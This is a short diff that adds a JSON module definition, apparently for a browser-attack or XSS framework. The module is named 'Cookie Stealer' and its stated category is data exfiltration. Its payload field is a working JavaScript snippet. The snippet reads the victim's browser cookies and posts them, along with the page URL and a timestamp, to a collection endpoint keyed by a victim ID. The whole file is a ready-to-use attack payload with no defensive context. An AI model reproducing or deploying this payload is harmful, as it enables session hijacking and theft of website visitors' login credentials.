@@ -1,0 +1,9 @@
+{
+  "name": "Cookie Stealer",
+  "description": "Extracts and exfiltrates browser cookies to specified endpoint",
+  "category": "Data Exfiltration",
+  "icon": "",
+  "inputs": [],
+  "payload": "<script>'use strict';(function(){__removeModule();var submitUrl='c/{{victim_id}}';var moduleId='{{module_id}}';var cookies=document.cookie;if(!cookies){return;}fetch(submitUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data_type:'module_data',module_id:moduleId,metadata:{cookies:cookies,url:window.location.href,timestamp:new Date().toISOString()}})});})();</script>",
+  "link": "c/{{victim_id}}"
+}
